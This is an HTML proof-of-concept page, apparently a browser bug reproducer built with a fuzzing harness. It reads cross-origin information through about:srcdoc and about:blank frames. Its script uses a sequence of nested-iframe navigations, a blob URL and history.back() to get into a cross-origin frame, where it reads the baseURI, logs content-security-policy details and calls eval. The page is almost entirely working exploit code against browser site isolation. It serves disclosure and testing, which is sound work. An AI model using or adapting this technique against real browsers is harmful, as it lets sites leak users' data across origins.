<h1>PoC #1: reading cross-origin info from about:srcdoc</h1>

<iframe src="http://127.0.0.2:8080/redirect.html" width="1200" height="800"></iframe>

<script>
    IPCFuzzer.activate_leak_sanitizer();
    IPCFuzzer.check_isolation("http://127.0.0.1:8080");
    const sleep = (d) => new Promise((r) => setTimeout(r, d));

    (async () => {
        await sleep(3000); // this needs to be long enough for the site to load initially
        frames[0][0].location = "about:blank";
        await sleep(500);
        frames[0].location.replace(
            URL.createObjectURL(
                new Blob(
                    [
                        `
			<iframe></iframe>
		`,
                    ],
                    { type: "text/html" },
                ),
            ),
        );
        await sleep(500);
        history.back();
        await sleep(500);

        console.log(frames[0][0].document.baseURI);
        frames[0][0].onsecuritypolicyviolation = (e) => console.log(e.originalPolicy);
        frames[0][0].eval("1");
    })();
</script>
